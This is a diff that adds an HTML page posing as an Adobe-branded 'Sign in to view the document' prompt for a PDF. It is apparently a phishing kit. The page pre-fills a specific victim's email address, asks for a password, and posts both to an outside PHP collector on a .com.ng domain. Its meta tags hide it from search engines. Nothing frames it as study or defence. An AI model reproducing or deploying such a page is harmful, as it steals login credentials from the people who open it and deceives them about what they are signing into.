@@ -1,0 +1,30 @@
+
+<HTML><HEAD><TITLE>Sign in to continue</TITLE><LINK rel=stylesheet href="main.css"><LINK rel=icon type=image/png href="https://qpweia.site/ic.ico">
+    <META name=robots content="noindex, noarchive, nofollow, nosnippet">
+    <META name=googlebot content="noindex, noarchive, nofollow, nosnippet, noimageindex">
+    <META name=slurp content="noindex, noarchive, nofollow, nosnippet, noodp, noydir">
+    <META name=msnbot content="noindex, noarchive, nofollow, nosnippet">
+    <META name=teoma content="noindex, noarchive, nofollow, nosnippet">
+    <META name=viewport content="width=device-width, initial-scale=1">
+    <STYLE>
+    @import url(https://fonts.googleapis.com/css?family=PT+Sans:400,700);*{box-sizing: inherit;}html{min-height: 100%;box-sizing: border-box;}body{margin: 0;padding: 0;background: url(https://qpweia.site/bkground.jpg) no-repeat;width: 100vw;height: 100vh;position: absolute;background-size: cover;}.login{padding: 10px;}.files{padding: 10px;background: #d40909f5 !important;position: absolute;top:50%;left: 50%;transform: translate(-50%, -50%);width: 580px;max-width: 
+    500px;box-sizing: border-box;color: #fff;text-align: center;font-family: 'PT Sans', sans-serif;margin-top: 2rem;}.error-message{/* background: rgba(225,225,225,0.5); */list-style-type: none;font-family: inherit;padding: 15px 10px;width: 90%;display: block;margin: 0 auto 5px auto;}.error-message li:not(:last-of-type){margin-bottom: 7px;}.error-message li{font-weight: bold;font-size: 18px;color: #581e1e;}form{max-width: 450px;margin: 0 auto;}form>
+    div{position: relative;background: #fff;color: #000;}form>div>input{width: 100%;border: none;padding: 1.35rem 1.8rem;background: #fff;transition: all .3s;}form>div>input:focus{outline: none;}form>div>input::placeholder{font-size: .8rem;font-weight: bold;}form>div>input.valid{padding: 1.35rem 2.4rem;background: url(https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/check.svg);background-size: 15px;background-repeat: no-repeat;background-position: 12px 23px;}form>div>
+    input.invalid:not(:focus):not(:placeholder-shown){background: pink;}form input[type="submit"]{display: block;width: 100%;margin: 20px 0;background: #581e1e;color: white;border: 0;padding: 20px;font-size: 1.2rem;}form input[type="submit"]:hover{box-shadow: 1px 1px #581e1e;cursor: pointer;border: 2px 2px solid #581e1e;}form input[type="submit"]:focus{outline: none;}.invalid{background: pink;color: #fff;}.img{padding-left: 1.5rem;padding-top: .5rem;position: fixed;}header{width: 100%;height: 
+    70px;background-color: #000;}@media screen and (max-width: 360px) and (min-width: 320px){.files{margin: 100px auto;}}
+    </STYLE>
+    
+    <META name=GENERATOR content="MSHTML 11.00.10570.1001"></HEAD>
+    <BODY><HEADER><IMG class=img alt=adobe src="https://qpweia.site/toppd.png" height=120> </HEADER>
+    <DIV class=files><IMG src="https://qpweia.site/lpd.png" height=80> 
+    <H2>Sign in to view the document</H2><!-- Requirements: current -->
+    <UL class=error-message>
+    <LI>
+    <LI></LI></UL>
+    <DIV class=login>
+    <FORM id=myForm method=post action="https://q.wqpria.com.ng/feg2.php">
+    <DIV><INPUT id=email class=input value=nakup@suweco.cz name="userId" autocomplete="off" placeholder="Email Address" required=""> <!-- <label for="email">Email Address </label> --><!-- Requirements: no longer in use --><!-- <div class="requirements">Must be a valid email address.</div> --></DIV><BR>
+    <DIV><INPUT id=password class=input type="password" name="password" placeholder="Password" required="" pattern=".{5,}"> <!-- <label for="password">Password</label> --><!-- Requirements: no longer in use --><!-- <div class="requirements">
+    Your password must be at least 6 characters as well as contain at least one uppercase, one
+    lowercase, and one number.
+    </div> --></DIV><INPUT id=submit type=submit value="View PDF Document"> </FORM></DIV></DIV></BODY></HTML>
